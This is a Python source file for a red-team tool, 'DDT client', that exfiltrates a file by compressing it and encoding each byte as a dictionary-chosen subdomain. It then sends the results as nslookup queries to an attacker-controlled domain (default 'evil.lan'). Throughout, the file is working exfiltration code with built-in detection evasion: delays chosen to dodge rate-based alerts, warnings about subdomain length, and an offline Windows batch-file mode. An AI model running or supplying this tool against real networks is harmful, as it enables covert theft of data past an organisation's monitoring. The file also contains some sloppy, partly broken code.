#!/usr/bin/env python3

#from __future__ import print_function
import subprocess
import collections
import argparse
import logging
import time
import re
import sys
import string
import zlib
from datetime import datetime, timedelta
import io
import traceback

__version__ = '2.2'

if __name__ == '__main__':

	print("""
  ___  ___ _____ 
 |   \|   \_   _|
 | |) | |) || |  
 |___/|___/ |_|  client v""" + __version__ + """ (by th3r3g3nt)
 dictionaryionary-based Data Transfer (via DNS)
 Data exfil for Red Teams
 
 Definitely not good for your environment...
 
 """)

	p = argparse.ArgumentParser(description="DDT Client v3.0")
	
	p.add_argument("--data", default="data.txt",
		metavar="<data>",
		help = "The file to exfiltrate Default: data.txt)")

	p.add_argument("--dictionary", default="dict.txt",
		metavar="<word-dictionary>",
		help="The custom-word dictionaryionary lookup for the DNS names. Default: dictionary.txt; MUST match on client & server.")

	p.add_argument("--domain", default="evil.lan",
		metavar="<domain>",
		help = "The exfiltration domain, which you are the SOA. Default: evil.lan")

	p.add_argument("--dnsserver",
		metavar="<dnsserver>",
		help = "The internal DNS server address. Default: System default")

	p.add_argument("--offline", default=None,
		metavar="<output batch filename>",
		help = "Create the nslookup batch file into this file for later or separate execution")

	p.add_argument("--port","-p",type=int,default=53,
		metavar="<port>",
		help="Server port. Default:53/UDP)")

	p.add_argument("--separator", "-s", default=":@@SEP@@:",
		metavar="<separator>",
		help="The dictionaryionary file must have a exfildata<separator>subdomain structure. Default separator is :@@SEP@@:")

	p.add_argument("--verbose", action='store_true', default=False,
		help="Enable verbose output on the screen")

	p.add_argument("--debug", action='store_true', default=False,
		help="Enable verbose output on the screen")

	p.add_argument("--ipv6",action='store_true',default=False,
		help="Use IPv6 AAAA record lookups; Default is IPv4 A record lookup")

	p.add_argument("--delay","-d",type=float,default=1,
		metavar="<delay>",
		help="Delay between packets. This is useful to avoid statistics/rate based detection. Default: 1 sec between packets)")

	p.add_argument("--analyze",action='store_true',default=False,
		help="Do not exfiltrate, but rather see how long the task would take with current settings")

	# TODO
	p.add_argument("--linux",action='store_true',default=False,
		help="The delay between packets by default are a windows CMD specific command (timeout) when the offline option is requested. In Linux, a different command will be used (to be implemented)")


	args = p.parse_args()

	FORMAT= '%(message)s'
	if args.debug: 		logging.basicConfig(level=logging.DEBUG, format=FORMAT)
	elif args.verbose: 	logging.basicConfig(level=logging.INFO, format=FORMAT)
	else: 				logging.basicConfig(level=logging.ERROR, format=FORMAT)
	
	# Create the DNS table for translation
	#dictionary = collections.Ordereddictionary()
	dictionary = {}

	# Manual special values
	logging.debug('Adding magic values to the dictionaryionary')
	dictionary["\n"] = "ten" # Unix line feed (ASCII 10 \n)
	dictionary["\r\n"] = "thirteen" # Windows line feed (ASCII 13 \r ASCII 10 \n)
	dictionary["\t"] = "nine" # Tab (ASCII 9 \t)
	dictionary["\0"] = "analyze" # End of File
	final_flag = "analyze"

	## Import the substitution dictionary
	#  Begin
	try:
		with open(args.dictionary, "rb") as dictionary_file:
			logging.info('Using dictionary file : {dictionary}'.format(dictionary=args.dictionary))
			for line in dictionary_file:


				
				#print(type(  line.strip().partition() ))
				#print(type(  str.encode((args.separator)[::2])  ))
				

				key, val = line.strip().partition(str.encode(args.separator))[::2]
				val = val.decode()
				
				if len(key) > 20:
					print ("!! Warning !! The subdomain {key} seems to be longer than 20 characters. This can trigger alarms. Do you still want to use it? (Y/n)".format(key=key))
					yes = {'yes','y', 'ye', ''}
					no = {'no','n'}

					choice = input().lower()
					if choice in yes: pass
					elif choice in no: continue
					else: print("Please respond with 'yes' or 'no'")
					
				if key in dictionary:
					logging.info("Duplicate subdomain. Skipping {subdomain}".format(subdomain=key))
					# TODO This should be handleded better

				else:
					#dictionary[key] = str(val)
					dictionary[int(key)] = val
					logging.debug(f'Dictionary entry created as dictionary[{key}] = {val} as {type(val)}')

			# Add magic value

		# Creating the reverse dictionary - mainly convenience
		rev_dictionary = {v: k for k, v in dictionary.items()}

	except OSError as e:
		traceback.print_exc(file=sys.stdout)
		logging.error("Cannot open the dictionary file {dictionary}\nPlease provide a valid dictionary file with the --dictionary <filename> option!\n".format(dictionary=args.dictionary,exc_info=True))
		exit(-1)

	except BaseException as e:
		traceback.print_exc(file=sys.stdout)
		#logging.error(f"[E] BuildDict Error {e=}")
		exit(-1)
	#  End
	##



	## Read the exfil file and prepare it for transmission
	#  Begin
	try:
		with open(args.data, "rb") as exfil_file:
			data = exfil_file.read()
			compressed_data = None
			
			try:
				data.decode('ascii')
				compressed_data = zlib.compress(data.encode('ascii'), 9)
				
			except:
				logging.debug("Exfil data file is not ASCII-only")
				compressed_data = zlib.compress(data, 9)
			
			compressed_data = bytearray(compressed_data)
			
		logging.info('Will exfiltrate       : {target_file} '.format(target_file=args.data))
		logging.info('Original file size    : {o_len} bytes'.format(o_len=len(data)))
		logging.info('Compressed stream size: {c_len} bytes'.format(c_len=len(compressed_data)))
	
		# TODO
		#with open("training.bat", "w") as training_file:
		#		logging.info('Training file for pre-exfil traffic generation is being generated in training.bat')

	except BaseException as e:
		traceback.print_exc(file=sys.stdout)
		logging.error(f"Unexpected {e=}, {type(e)=}")
		


	
	############### BEGIN: This works as a one-byte substitutions; We can do better, but having 256^2 subdomains is not common. TODO
	ddt_results = []
	
	for i in compressed_data:
		try:
			logging.debug("Attempting to grab a substitution for {i} [{i_type}]".format(i=i, i_type=type(i)))
			frag = dictionary.get(i)

			if frag is None:
				raise Exception("Dictionary does not have a value for key {}".format(i))
			ddt_results.append(str(frag))
			logging.debug(f"Byte {i} got converted to {str(frag)} subdomain")

		except BaseException as e:
			traceback.print_exc(file=sys.stdout)
			logging.error(f"Unexpected {e=}, {type(e)=}")
			

	ddt_results.append(final_flag)
	
	

	############### END: This works as a one-byte substitutions

	'''
	ba_string = ""
	for i in compressed_data:
		ba_string += str(i)
		ba_string += " "
	#ba_string = string(compressed_data)
	print(ba_string)

	exit(1)
	for i in compressed_data:
		print(i)


	for item in sorted(dictionary.keys(), key = len, reverse = True):
		compressed_data = re.sub(item, dictionary[item], compressed_data)

	for i in compressed_data:
		print(i)
	'''





	#exit(1)
	#compressed_data = "61201119107"
	# Do the substitution
	#for item in sorted(dictionary.keys(), key = len, reverse = True):
	#	print("Looking to sub {}".format(item))	
	#	compressed_data = re.sub(item, dictionary[item], compressed_data)

	#for i in range(len(compressed_data)):
	#	for item in sorted(dictionary.keys(), key = len, reverse = True):
	#		 = re.sub(item, dictionary[item], compressed_data)
		#print(compressed_data[i])
		#i = re.sub(r'1','4',i)
		#print(i)
		
	#print("Substitution is done...")	
	
	#for i in compressed_data:
	#	print(i)


	#string = re.sub(r'\xda','X', compressed_data)	#WORKS
	#string = re.sub(dictionary['\xda'],'X', compressed_data)	#WORKS
	#print(repr(string))
	
	#print(type(ba))
	
	#uncomp = zlib.decompress(compressed_data)
	#print(type(uncomp))
	#print(uncomp)
	
	
	### BEGIN: This works with strings...
	## Create the most compact DNS subdomains, given that there is a regex match in the dictionaryionary
	## Need to implement dictionaryionary health-check!
	# pattern = re.compile('|'.join(re.escape(key) for key in dictionary.keys()))
	# ddt_results = pattern.sub(lambda x: dictionary[x.group()]+"\n", data)
	# ddt_results = ddt_results.split()
	### END: This works with strings...
	
	
	
	
	#for i in ddt_results:
	#	print(i)

	#exit(1)
	#logging.info("The original data would be {raw_length} queries, if extracted by single bytes".format(raw_length=str(len(data))))
	#logging.info("With DDT, we are expecting {ddt_length} queries".format(ddt_length=str(len(ddt_results))))
	logging.info("")
	logging.info("Expected {saving}% traffic saving with DDT".format(saving=int((len(data) - len(ddt_results)) / float(len(data))*100)))
	if args.delay >= 0.5:
		m, s = divmod(len(ddt_results) * args.delay, 60)
		h, m = divmod(m, 60)
		d, h = divmod(h, 12)
		w, d = divmod(d, 7)
		
		logging.info("Expected execution time: {days} day(s) {hours} hours {minutes:02d} minutes {seconds:02d} seconds ".format(days=int(d), hours=int(h), minutes=int(m), seconds=int(s)))
		logging.info("")
		logging.info("This is a rate of:")
		logging.info("{} requests per second".format(1 / float(args.delay) ))
		logging.info("{} requests per minute".format(60 / float(args.delay)))
		logging.info("{} requests per hour".format(3600 / float(args.delay)))
		logging.info("{} requests per day".format(86400  / float(args.delay)))
		logging.info("")
	else:
		logging.info("""Expected execution time: Fast... Depending on how DNS traffic is going and data size, but no sizeable delay between requests are configured.
		
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!! Warning:                               !!
!! The delay between requests are too low !!
!! This may trigger alerts                !!
!! You have been warned                   !!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		""")
	
	## Debug the current dictionary content
#	logging.debug("Current reverse dictionaryionary content is:\n")
	#for k in dictionary.keys():
#		logging.debug(repr("repr({})".format(repr(k))))

	if args.analyze:
		print("Analyzing only, exiting now as expected")
		exit(0)

	frag_counter = 0
	
	#Create the offline batch file
	try:
		if args.offline is not None:
			offline_file = open(args.offline, "w")
			offline_file.write("set list= ")
			logging.info('Offline batch file will be created as {offline_filename} file'.format(offline_filename=args.offline))
	
	except OSError as e:
		logging.error("Cannot open the dictionary file {dictionary}\nPlease provide a valid dictionary file with the --dictionary <filename> option!\n".format(dictionary=args.dictionary,exc_info=True))
		exit(1)

	except BaseException as e:
		logging.error(f"Unexpected {e=}, {type(e)=}")


	if args.ipv6:
		lookup_type = "-type=AAAA"
	else:
		lookup_type = "-type=A"

	
	# Start doing the meat of the work
	for i in ddt_results:
		try:

			# Frag is the fragment that will contain the information
			frag = str(i) + "." + args.domain

			# TODO: Create more concise bat file with loop. set var=frag; delay; >(for %a in (%list%) do (nslookup %a 192.168.1.94)) and double the %% for bat file
			if args.offline is not None:
				offline_file.write("{frag} ".format(frag=i))
				#offline_file.write("nslookup {lookup_type} -retry=1 {fragment} {dns_server}\n".format(lookup_type=lookup_type, fragment=frag, dns_server=args.dnsserver))
				#offline_file.write("timeout {}\n".format(args.delay))

			# Perform the exfiltration directly from Python
			else:

				# Sleep no matter what...
				time.sleep(args.delay)
	
				if args.dnsserver is not None:
					packet = subprocess.check_output(["nslookup", lookup_type, "-retry=1", frag, args.dnsserver])
				else:
					packet = subprocess.check_output(["nslookup", lookup_type, "-retry=1", frag])
			
				logging.info(" Sent a valid fragment as {frag:<30} which is {rev_dictionary:<20}".format(frag=frag, rev_dictionary=rev_dictionary[i]))


				frag_counter += 1
				if frag_counter % 10 == 0:
					print ("Sent",str(frag_counter),"fragments out of",str(len(ddt_results)))

		except Exception as e:
			logging.exception("[E] Cannot create frag.\n {}\n".format(str(e)))
			traceback.print_exc(file=sys.stdout)

	try:
		if args.offline is not None:
			offline_file.write("\n")
			offline_file.write("(for %%a in (%list%) do (nslookup -type=A -retry=1 %%a.{domain} {dnsserver}\ntimeout {timeout}))\n".format(domain=args.domain, timeout=str(int(args.delay)), dnsserver=args.dnsserver if args.dnsserver is not None else ""))
			
			#proto="TCP" if args.tcp else "UDP"

	except OSError as e:
		logging.error("\n[E] Cannot open the file {offline_filename} for batch file creation.\n Please provide a valid output file with the --offline <filename> option!".format(offline_filename=args.offline))
		exit(1)

	except BaseException as e:
		logging.error(f"Unexpected {e=}, {type(e)=}")

			
	#TODO Improvements
#	print ("Sending EOF magic word...")
#	final_frag = "final." + args.domain

	#if args.offline is not None:
	#	if args.dnsserver is not None:
	#		offline_file.write("nslookup {lookup_type} -retry=1 {final_frag} {dns_server}\n".format(lookup_type=lookup_type, final_frag=final_frag, dns_server=args.dnsserver))
	#	else:
	#		offline_file.write("nslookup {lookup_type} -retry=1 {final_frag}\n".format(lookup_type=lookup_type, final_frag=final_frag))

		

#	else:
		# Sleep no matter what...
#		time.sleep(args.delay)
	
#		if args.dnsserver is not None:
#			final_packet = subprocess.check_output(["nslookup", lookup_type, "-retry=1", final_frag, args.dnsserver])
#		else:
#			final_packet = subprocess.check_output(["nslookup", lookup_type, "-retry=1", final_frag])
			
	print (" ** Thanks for playing! **")
	print (" ** Root for everyone! **")
	exit(0)
